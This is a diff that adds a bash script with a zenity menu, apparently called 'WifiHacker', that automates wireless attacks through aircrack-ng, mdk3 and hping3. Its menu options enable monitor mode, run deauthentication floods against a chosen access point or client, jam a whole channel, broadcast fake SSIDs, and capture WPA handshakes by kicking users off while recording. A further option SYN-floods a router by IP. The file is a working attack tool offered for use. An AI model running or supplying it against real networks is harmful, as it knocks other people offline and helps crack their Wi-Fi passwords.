@@ -1,0 +1,376 @@
+#!/usr/bin/env bash
+
+#color codes
+B='\e[1m'
+r='\e[31m'
+g='\e[1;32m'
+y='\e[1;33m'
+b='\e[1;34m'
+p='\e[1;35m'
+s='\e[0m'
+bl='\e[5m'
+
+trap_ctrlc () {
+tput bel
+ask=`zenity --question --text "Are you sure you want to quit?" --no-wrap --ok-label "Yes" --cancel-label "No"`
+if [ -z $ask ]
+then
+menu
+
+else
+bye
+exit 2
+
+fi
+}
+
+trap "trap_ctrlc" 2
+
+#an useless bye function :)
+bye () {
+printf "\n${B}${y}g${s}"
+sleep 0.2
+printf "${g}o"
+sleep 0.2
+printf "${b}o"
+sleep 0.2
+printf "${p}d "
+sleep 0.2
+printf "${p}b"
+sleep 0.2
+printf "${b}y"
+sleep 0.2
+printf "${g}e "
+sleep 0.2
+printf "${bl}:)${s}"
+}
+
+
+#network interface
+phy=$(basename /sys/class/net/wl*)
+
+if [ "$phy" == "wl*" ];
+then
+   phy='not found'
+fi
+
+#turn on monitor mode [1]
+on () {
+echo -e "${B}${b}[*]${y}Turning on monitor mode...${s}"
+sudo xterm -e airmon-ng check kill
+echo -e "${B}${b}[*]${y}Try to make ${phy} interface down...${s}"
+sleep 1
+sudo xterm -e ip link set ${phy} down 2>/dev/null
+echo -e "${B}${b}[*]${y}Turning on monitor mode...${s}"
+sleep 1
+sudo xterm -e ip link set ${phy} name wlan0mon 2>/dev/null
+sleep 1
+echo -e "${B}${b}[*]${y}Changing card mode to monitor from managed...${s}"
+sudo xterm -e iw dev wlan0mon set type monitor
+echo -e "${B}${b}[*]${y}Turned on monitor mode successfully!!!${s}"
+}
+
+
+
+
+#turn off monitor mode [2]
+off () {
+echo -e "${B}${b}[*]${r}turning off monitor mode...${s}"
+sleep 1
+sudo xterm -e ip link set wlan0mon up
+
+echo -e "${B}${b}[*]${r}turning interface mode managed from monitor...${s}"
+sleep 1
+sudo xterm -e iw dev wlan0mon set type managed
+
+echo -e "${B}${b}[*]${r}trying to restart NetworkManager...${s}"
+sudo xterm -e service NetworkManager restart
+sleep 1
+echo -e "${B}${b}[*]${r}monitor mode turned off...${s}"
+}
+
+
+
+#check injection [3]
+aireplay () {
+sudo aireplay-ng -9 wlan0mon
+}
+
+
+
+
+#run airodump-ng [4]
+airodump_ask () {
+r=$(zenity --info --title 'airodump-ng' --text 'Scan single target(wifi) or full network' --extra-button single --extra-button full --ok-label back --width=400)
+
+if [ -z $r ];
+then
+menu
+
+elif [ "$r" == "full" ];
+then
+reset;
+sudo airodump-ng wlan0mon
+
+
+
+else
+airodump_run
+fi
+}
+
+airodump_run () {
+if [ "$r" == "single" ];
+then
+loot=`iwlist wlan0mon scan | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}'`
+
+bssid=`zenity --list --title="airodump-ng" --text="enter BSSID address" --cancel-label="enter manually" --column="BSSID" $loot --width=500 --height=350`
+
+fi
+
+if [ -z $bssid ];
+then
+bssid=$(zenity --entry --title="select BSSID" --text="enter target BSSID" --width=400 )
+reset;
+sudo airodump-ng --bssid $bssid wlan0mon
+
+elif [ -z $bssid ];
+then
+zenity --error --width=250
+
+else
+sudo airodump-ng --bssid $bssid wlan0mon
+
+fi
+}
+
+
+
+#deauth wifi 5
+kicks () {
+if [ "$r" == "s" ] || [ "$r" == "S" ];
+then
+
+loot=`iwlist wlan0mon scan | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}'`
+
+bssid=`zenity --list --title="Deauth wifi" --cancel-label="enter manually" --column="BSSID" $loot --width=500 --height=350`
+fi
+
+if [ -z $bssid ]
+then
+sudo xterm -T "all local wifi networks | press (Ctrl-C) to stop me" -e "airodump-ng wlan0mon" &
+
+bssid=$(zenity --entry --title="select BSSID" --text="enter target BSSID" --width=500 )
+
+mac=$(zenity --entry --title="Deauth wifi" --text="enter client MAC address" --width=500 )
+
+num=$(zenity --entry --title="Deauth wifi" --text="enter the number of deauth req (example: 200) " --width=300)
+
+sudo aireplay-ng --deauth $num -a $bssid -D -c $mac wlan0mon
+
+else
+mac=$(zenity --entry --title="Deauth wifi" --text="enter client MAC address" --width=500 )
+
+num=$(zenity --entry --title="Deauth wifi" --text="enter the number of deauth req (example: 200) " --width=300)
+
+sudo aireplay-ng --deauth $num -a $bssid -D -c $mac wlan0mon
+sudo killall xterm
+fi
+}
+
+
+kickf () {
+loot=`iwlist wlan0mon scan | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}'`
+
+bssid=`zenity --list --title="Deauth wifi" --column="BSSID" --cancel-label="enter manually" $loot --width=500 --height=350`
+
+if [ -z $bssid ];
+then
+
+sudo xterm -T "all local wifi networks | press (Ctrl-C) to stop me" -e "airodump-ng wlan0mon" &
+
+bssid=$(zenity --entry --title="Deauth wifi" --text="enter target BSSID" --width=500)
+
+num=$(zenity --entry --title="WifiHacker" --text="enter the number of deauth req (example: 200)" --width=300)
+
+sudo aireplay-ng --deauth $num -D -a $bssid wlan0mon
+
+sudo killall xterm
+
+else
+num=$(zenity --entry --title="WifiHacker" --text="enter the number of deauth req (example: 200)" --width=300)
+
+sudo aireplay-ng --deauth $num -D -a $bssid wlan0mon
+fi
+}
+
+
+
+#deauth wifi channel [6]
+mdk () {
+
+channel=$(zenity --entry --title="deauth wifi channel" --text="enter channel number" --width=400)
+
+if [ -z $channel ];
+then
+zenity --error --width=250
+
+
+else
+sudo xterm -T "all local wifi networks | press (Ctrl-C) to stop me" -e "airodump-ng wlan0mon" &
+echo -e "${B}${y}[!]${r}press ( Ctrl + C ) to stop${s}"
+sudo mdk3 wlan0mon d -c $channel
+fi
+}
+
+
+
+#create muliple fake ssid
+mdk1 () {
+channel=$(zenity --entry --title="create" --text="enter channel number" --width=300)
+
+txt=$(zenity --file-selection)
+
+if [ -z $txt ] || [ -z $channel ];
+then
+zenity --error --width=250
+exit 2
+
+else
+echo -e "${B}${b}[*]${y}creating multiple SSID with mdk3..."
+sleep 1
+echo -e "${B}${b}[*]${y}muliple SSID created successfully..."
+sudo mdk3 wlan0mon b -c $channel -f $txt
+fi
+}
+
+
+
+#capture handshake
+handshake () {
+
+sudo xterm -T "all local wifi networks | press (Ctrl-C) to stop me" -e "airodump-ng wlan0mon" &
+
+loot=`iwlist wlan0mon scan | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}'`
+
+bssid=`zenity --list --title="Deauth wifi" --cancel-label="enter manually" --text="select BSSID" --column="BSSID" $loot`
+
+req=$(zenity --entry --title="WifiHacker" --text="enter the number of deauth req (default: 200)" --width=300)
+
+if [ -z "$bssid" ]
+then
+bssid=$(zenity --entry --title="WifiHacker" --text="enter target BSSID" --width=400 )
+fi
+
+if [ -z $req ]
+then
+req=200
+fi
+
+sudo killall xterm
+
+sudo xterm -T "Trying to capture handshake | press (Ctrl + C) to stop " -e "/usr/sbin/airodump-ng --bssid ${bssid} --write 'captured-handshake' wlan0mon" &
+
+sudo xterm -T "Trying to deauthenticate users from the wifi" -e "/usr/sbin/aireplay-ng --deauth ${req} -D -a ${bssid} wlan0mon" &
+
+sleep $req
+
+sudo killall xterm
+
+exit 2
+}
+
+
+
+#router dos
+router () {
+
+ip=$(zenity --entry --title="Router DOS" --text="enter the routers IP address" --width=400)
+
+if [ -z "$ip" ]
+then
+`zenity --error --text="please enter an valid IP address" --width=250`
+exit 2
+
+else
+sudo hping3 -i u1 -S $ip
+fi
+}
+
+
+menu () {
+c=$(zenity --list --title="Network interface ${phy}" --text="Select an option" --column="numbers" --column="options" \
+1 "turn on monitor mode" \
+2 "turn off monitor mode" \
+3 "check injection" \
+4 "run airodump-ng" \
+5 "deauth wifi" \
+6 "deauth channel" \
+7 "create muliple fake SSID" \
+8 "capture handshake" \
+9 "router dos" \
+0 "exit" --width=600 --height=350)
+
+if [ "$c" == "1" ];
+then
+on
+
+
+elif [ "$c" == "2" ];
+then
+off
+
+
+elif [ "$c" == "3" ];
+then
+aireplay
+
+
+elif [ "$c" == "4" ];
+then
+airodump_ask
+
+
+elif [ "$c" == "5" ];
+then
+r=$(zenity --info --title 'deauth wifi' --text 'Attack on a clients MAC address or directly BSSID?' --extra-button MAC --extra-button BSSID --ok-label back --width=400)
+
+[ -z $r ] && menu
+
+[ "$r" == "BSSID" ] && kickf
+
+
+[ "$r" == "MAC" ] && kicks
+
+
+elif [ "$c" == "6" ];
+then
+mdk
+
+elif [ "$c" == "7" ];
+then
+mdk1
+
+
+elif [ "$c" == "8" ];
+then
+handshake
+
+
+elif [ "$c" == "9" ];
+then
+router
+
+
+elif [ "$c" == "0" ];
+then
+bye
+
+
+elif [ "$c" == "" ];
+then
+echo -e "${B}${y}[!]${r}Invalid input${s}"
+
+fi
+}
+menu
